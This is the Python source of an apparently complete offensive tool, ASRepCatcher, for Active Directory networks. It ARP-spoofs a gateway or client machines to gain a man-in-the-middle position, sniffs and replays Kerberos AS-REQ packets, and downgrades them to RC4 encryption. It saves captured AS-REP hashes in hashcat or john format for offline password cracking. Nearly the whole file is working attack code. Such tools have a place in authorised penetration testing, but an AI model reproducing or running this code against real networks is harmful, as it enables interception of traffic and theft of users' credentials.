#!/usr/bin/env python3


# Author : Yassine OUKESSOU




from scapy.all import *
import asn1
import os
import argparse
from argparse import RawTextHelpFormatter
import time
import threading
import ipaddress

decoder = asn1.Decoder()
stop_arp_spoofing_flag = threading.Event()

def handle_KRB_AS_REP(packet):
    if packet.haslayer(KRB_TGS_REP):
        decoder.start(bytes(packet.root.cname.nameString[0]))
        username = decoder.read()[1].decode()
        decoder.start(bytes(packet.root.crealm))
        domain = decoder.read()[1].decode()
        if username not in UsernamesSeen and username not in UsernamesCaptured :
            print(f'[+] Sniffed TGS-REP for user {username}@{domain}')
            UsernamesSeen.add(username)
            return
    if not packet.haslayer(KRB_AS_REP):
        return
    decoder.start(bytes(packet.root.cname.nameString[0]))
    username = decoder.read()[1].decode()
    decoder.start(bytes(packet.root.crealm))
    domain = decoder.read()[1].decode()
    print(f'[+] Got ASREP for username : {username}@{domain}')
    if username.endswith('$') :
        print(f'[*] Machine account, skipping...')
        return
    decoder.start(bytes(packet.root.encPart.etype))
    etype = decoder.read()[1]
    decoder.start(bytes(packet.root.encPart.cipher))
    cipher = decoder.read()[1].hex()
    if HashFormat == 'hashcat':
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
        else :
            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    else :
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
        else :
            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
        print(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
        return
    else :
        print(f'[+] Found hash to crack : {HashToCrack}')
        if username in UsernamesCaptured :
            UsernamesCaptured[username].append(etype)
        else :
            UsernamesCaptured[username] = [etype]
    if etype == 17 and HashFormat == 'hashcat' :
        print('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32100 ')
    if etype == 18 and HashFormat == 'hashcat' :
        print('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32200 ')
    with open(outfile, 'a') as f:
        f.write(HashToCrack + '\n')
    if mode == 'listen' and not keep_spoofing and not disable_spoofing :
        Targets.remove(packet[IP].dst)
        restore(gw,packet[IP].dst)
        print(f'[+] Restored arp cache of {packet[IP].dst}')



def handle_KRB_AS_REQ(packet):
    if packet.haslayer(KRB_AS_REQ) :
        decoder.start(bytes(packet.root.reqBody.cname.nameString[0]))
        username = decoder.read()[1].decode()
        decoder.start(bytes(packet.root.reqBody.realm))
        domain = decoder.read()[1].decode()
        if username.endswith('$') :
            if username not in UsernamesSeen :
                print(f'[+] Sniffed AS-REQ for user {username}@{domain}, will not try to get AS-REP')
                UsernamesSeen.add(username)
            return
    else :
        return
    packet.root.reqBody.etype = [ASN1_INTEGER(23)]
    packet.root.reqBody.kdcOptions = ASN1_BIT_STRING('01010000100000000000000000000000')
    #print(f'[+] Changed etype for {username}')
    print(f'[+] AS-REQ passing through for {username}@{domain}')


    sport = random.randint(1024, 65535)
    dst_ip = packet[IP].dst
    KRB_PACKET_LEN = len(bytes(packet[Kerberos]))
    ip = IP(dst=dst_ip)
    

    # SYN
    SYNACK = sr1(ip / TCP(sport=sport, dport=88, flags='S', seq=1000), verbose=False)

    # SYN-ACK
    send(ip / TCP(sport=sport, dport=88, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1), verbose=False)
    crafted_packet = ip / TCP(sport=sport, dport=88, flags='PA', seq=SYNACK.ack, ack=SYNACK.seq+1) / KerberosTCPHeader(len=KRB_PACKET_LEN) / packet[Kerberos]
    print(f'[+] Sent AS-REQ to {dst_ip}')
    #crafted_packet.show()
    response = sr1(crafted_packet, timeout=2, verbose=False)


    if response.haslayer(KRB_AS_REP):
        if not keep_spoofing and not disable_spoofing :
            Targets.remove(packet[IP].src)
            restore(packet[IP].src, gw)
            print(f'[+] Restored arp cache of {packet[IP].src}')
            #response.show()
        return(handle_KRB_AS_REP(response))



def listen_mode():
    try :
        sniff(filter=f"src port 88", prn=handle_KRB_AS_REP)
    except KeyboardInterrupt :
        pass
    except Exception as e :
        print(f'[-] Got error : {e}')
    finally :
        if not disable_spoofing :
            stop_arp_spoofing_flag.set()
            print('\n[*] Restoring arp cache of the gateway, please hold...')
            restore_all_targets()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print('[*] Disabled IPV4 forwarding')



def replay_mode():
    os.system("iptables-save > asrepcatcher_rules.v4")
    print('[*] Saved current iptables')
    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
    print('[*] Modified iptables')
    # old_mtu = os.popen(f'ip a | grep {iface} | grep -oE "mtu [0-9]+"').read().split()[1]
    # print(f'old_mtu : {old_mtu}')
    # if int(old_mtu) < 3000 :
    #     os.system(f'ifconfig {iface} mtu 3000 up')
    #     print("Raised interface MTU to 3000")
    try :
        sniff(filter=f"dst port 88 and inbound", prn=handle_KRB_AS_REQ)
    except KeyboardInterrupt :
        pass
    except Exception as e :
        print(f'[-] Got error : {e}')
    finally:
        if not disable_spoofing :
            stop_arp_spoofing_flag.set()
            print(f'\n[*] Restoring arp cache of {len(Targets)} poisoned targets, please hold...')
            restore_all_targets()
        os.system("iptables-restore < asrepcatcher_rules.v4")
        print("[*] Restored iptables")
        # os.system(f'ifconfig {iface} mtu {old_mtu} up')
        # print('[*] Restored old MTU')
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print('[*] Disabled IPV4 forwarding')




def restore(poisoned_device, spoofed_ip):
    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
    send(packet, verbose = False, count=1)

def restore_listenmode(dic_mac_addresses):
    del dic_mac_addresses[gw]
    for ip_address in dic_mac_addresses :
        packet = ARP(op = 2, pdst = gw, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]) 
        send(packet, verbose = False, count=1)


def replaymode_arp_spoof(spoofed_ip):
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
        time.sleep(1)

def listenmode_arp_spoof():
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
        time.sleep(1)

def get_all_mac_addresses():
    mac_addresses = {}
    ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
    subnet = ipaddress.ip_network(ip_with_mask, strict=False)
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(subnet)),timeout=0.5,verbose=False)
    for i in ans :
        mac_addresses[i[1].psrc] = i[1].hwsrc
    return(mac_addresses)



def restore_all_targets():
    if mode == 'replay':
        for target in Targets :
            restore(target,gw)
    elif mode == 'listen':
        restore_listenmode(get_all_mac_addresses())

def is_valid_ip_list(iplist):
    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
        return False
    return True

def is_valid_ipwithmask(ip_with_mask):
    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
        return False
    return True

def main():
    if mode == 'replay' :
        replay_mode()
    else :
        listen_mode()

def display_banner():
    print("""            _____ _____             _____      _       _               
     /\    / ____|  __ \           / ____|    | |     | |              
    /  \  | (___ | |__) |___ _ __ | |     __ _| |_ ___| |__   ___ _ __ 
   / /\ \  \___ \|  _  // _ \ '_ \| |    / _` | __/ __| '_ \ / _ \ '__|
  / ____ \ ____) | | \ \  __/ |_) | |___| (_| | || (__| | | |  __/ |   
 /_/    \_\_____/|_|  \_\___| .__/ \_____\__,_|\__\___|_| |_|\___|_|   
                            | |                                        
                            |_|                                          by Yassine OUKESSOU


                            """)

if __name__ == '__main__':
    if not 'SUDO_UID' in os.environ:
        print("Please run as root")
        sys.exit(1)

    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=RawTextHelpFormatter)

    parser.add_argument('mode', choices=['listen', 'replay'], action='store', help="Listen mode : Only the gateway's ARP cache is poisonned, AS-REP packets going to clients are sniffed\n"
                                                                                    "Replay mode : Only the client computers' ARP caches are poisonned, AS-REQ requests are replayed to capture AS-REP")
    parser.add_argument('-t', action='store', metavar = "Client computers", help='Comma separated list of client computers IPs or subnet (IP/mask). In replay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet')
    parser.add_argument('-tf', action='store', help='File containing targets')
    parser.add_argument('-gw', action='store', help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. Only this IP is poisoned in listen mode. Default is default interface\'s gateway')
    parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REQ of users without pre-authentication. Default is hashcat')
    parser.add_argument('-iface', action='store', help='Interface to use. Uses default interface if not specified')
    parser.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default')
    parser.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method')

    if len(sys.argv)==1:
        display_banner()
        parser.print_help()
        sys.exit(1)

    display_banner()
    parameters = parser.parse_args()
    if parameters.keep_spoofing == True and parameters.disable_spoofing == True :
        print('[!] Cannot use --keep-spoofing and --disable-spoofing at the same time')
        sys.exit(1)


    if parameters.t is not None and parameters.tf is not None :
        print('[!] Cannot use -t and -tf simultaneously')
        sys.exit(1)


    mode = parameters.mode
    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
    HashFormat = parameters.format
    iface = parameters.iface if parameters.iface is not None else conf.iface
    keep_spoofing = parameters.keep_spoofing
    disable_spoofing = parameters.disable_spoofing
    gw = parameters.gw if parameters.gw is not None else conf.route.route("0.0.0.0")[2]



    if parameters.iface is None :
        print(f'[*] No interface specified, will use the default interface : {iface}')
    else :
        if parameters.iface not in get_if_list():
            print(f'[!] Interface {iface} was not found. Quitting...')
            sys.exit(1)

    if parameters.gw is None :
        print(f'[*] No gateway specified, will use the default gateway of {iface} : {gw}')


    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print('[*] Enabled IPV4 forwarding')


    UsernamesCaptured = {}
    UsernamesSeen = set()
    HashesCaptured = set()
    print(f'[*] Gateway IP : {gw}')
    print(f'[*] Interface : {iface}')

    if parameters.t is not None :
        if is_valid_ip_list(parameters.t.replace(' ','')) :
            TargetsList = parameters.t.replace(' ','').split(',')
        elif is_valid_ipwithmask(parameters.t) :
            subnet = ipaddress.ip_network(parameters.t, strict=False)
            TargetsList = [str(ip) for ip in subnet.hosts()]
        else :
            print('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
            sys.exit(1)
    elif parameters.tf is not None :
        try :
            with open(parameters.tf, 'r') as f:
                iplist = f.read().strip().replace('\n',',')
        except Exception as e :
            print(f'[-] Error : {e}')
            # print('Could not read the file')
            sys.exit(1)
        if not is_valid_ip_list(iplist) :
            print('[!] IP list in a bad format')
            sys.exit(1)
        TargetsList = iplist.split(',')
    else :
        ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
        subnet = ipaddress.ip_network(ip_with_mask, strict=False)
        TargetsList = [str(ip) for ip in subnet.hosts()]
        TargetsList.remove(gw)
        print(f'[*] Targets not supplied, will use local subnet {subnet} minus the gateway')

    if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
        print('[*] Found gateway in targets list. Removing it')
        TargetsList.remove(gw)

    print(f'[*] Scanning {iface} subnet')
    mac_addresses = get_all_mac_addresses()

    if gw not in mac_addresses :
        print('[-] Gateway did not respond to ARP. Quitting...')
        sys.exit(1)

    Targets = set(TargetsList)

    my_ip = get_if_addr(conf.iface)
    if my_ip in Targets :
        Targets.remove(my_ip)

    
    if not disable_spoofing :
        if parameters.mode == 'replay':
            Targets = Targets - (Targets - set(mac_addresses.keys()))
            if Targets == set() :
                print('[-] No target responded to ARP. Quitting...')
                sys.exit(1)
            thread = threading.Thread(target=replaymode_arp_spoof, args=(gw,))
            thread.start()
        elif parameters.mode == 'listen':
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.start()
        print('[+] Started ARP spoofing')
    else :
        print(f'[!] ARP spoofing disabled')

    main()